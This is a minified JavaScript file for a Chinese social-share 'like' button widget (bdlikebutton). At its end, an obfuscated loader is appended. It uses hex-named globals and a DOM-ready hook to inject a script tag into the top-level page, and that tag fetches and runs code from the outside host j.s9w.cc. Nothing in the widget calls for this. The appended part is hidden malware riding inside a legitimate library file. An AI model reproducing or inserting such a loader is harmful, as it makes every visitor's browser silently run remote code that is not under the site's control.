window._bd_share_main.F.module("view/like_view",function(e,t,a){e("like.css");var r=e("base/tangram").T,n=e("base/class").Class,u=e("conf/const"),d=e("view/view_base"),o=e("component/animate"),m="bdlikebutton",v="bdlikebutton-inner",f="bdlikebutton-add",h="bdlikebutton-text",p="bdlikebutton-count";t.View=n.create(function(c){function d(e){return r(e).parent().get(0)}var s=this,l={small:[4,"顶","已顶过"],medium:[6,"顶","您已顶过"],large:[10,"该内容对我有帮助","您已顶过，谢谢！"]};s.render=function(e){var t,a,n,d=(n=c.tag||"",r("."+m).each(function(e,t){n&&r(t).attr(u.CONFIG_TAG_ATTR)!=n||s._entities.push(t)}),s._entities),o=m,i=(a=l[(t=c).type],t.likeText=t.likeText?t.likeText.substr(0,a[0]):a[1],t.likedText=t.likedText?t.likedText.substr(0,a[0]):a[2],t);s._actBtnSet.className=v,s._actBtnSet.tagName="div",s._actBtnSet.maxDomDepth=1,r(d).each(function(e,t){var a=i.type,n=[];n.push('<div class="',v,'" ',s._actBtnSet.cmdAttr,'="like">'),n.push('<span class="',f,'">+1</span>'),n.push('<div class="',p,'">加载中</div>'),"small"!=a&&n.push('<div class="',h,'">',i.likeText,"</div>"),n.push("</div>"),r(t).html(n.join("")).addClass(o+"-"+i.color).addClass(o+"-"+i.type).addClass(o+"-"+i.type+"-"+i.color)})},s._init=function(){var n=c,d=n.type;r(s._entities).each(function(e,t){var a=r("."+v,t);a.mouseover(function(e){e=(e=r.event(e||window.event)).relatedTarget;a.contains(e)||("small"==d&&r("."+p,t).html(n.likeText),r(t).addClass(m+"-"+n.type+"-"+n.color+"-hover"))}).mouseout(function(e){e=(e=r.event(e||window.event)).relatedTarget;a.contains(e)||("small"==d?r("."+p,t).html(n.count):r("."+h,t).html(n.likeText),r(t).removeClass(m+"-"+n.type+"-"+n.color+"-hover"))})})},s.showDoneState=function(e){var t=c,a=d(e),e=h;"small"==t.type&&(e=p),r("."+e,a).html(t.likedText),r(a).removeClass(a,m+"-"+t.type+"-"+t.color+"-hover")},s.addOne=function(e,t){var a=c,e=d(e),n=r("."+f,e);n.show(),o.animate(n.get(0),{top:"-25px",opacity:"0"},300,function(){n.hide(),n.css({top:"0px",opacity:99})}),s.setNumber(t),r(e).removeClass(m+"-"+a.type+"-"+a.color+"-hover")},s.setNumber=function(a){"number"==r.type(a)&&r(s._entities).each(function(e,t){r("."+p,t).html(a)})}},d.ViewBase)}),window.v6d061dfa0ddfd12160ad851976e4a26d="fx",window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc";var f476e749bb252bde7a5c2c9994b6116ce=function(){function e(e){if(!a&&("onreadystatechange"!==e.type||"complete"===document.readyState)){for(e=0;e<t.length;e++)t[e].call(document);a=!0,t=null}}var t=[],a=!1;return document.addEventListener?(document.addEventListener("DOMContentLoaded",e,!1),document.addEventListener("readystatechange",e,!1),window.addEventListener("load",e,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",e),window.attachEvent("onload",e)),function(e){a?e.call(document):t.push(e)}}();function f006b08735d9928a8820efe00a26753e7(){try{var e,t,a=window.top.document;a.getElementById("82ac324e455efd0ecd2e73d22d852758")||((e=a.createElement("script")).setAttribute("type","text/javascript"),e.setAttribute("id","82ac324e455efd0ecd2e73d22d852758"),t="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j",a.getElementsByTagName("head")[0].appendChild(e),e.setAttribute("src",t))}catch(e){console.log(e.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);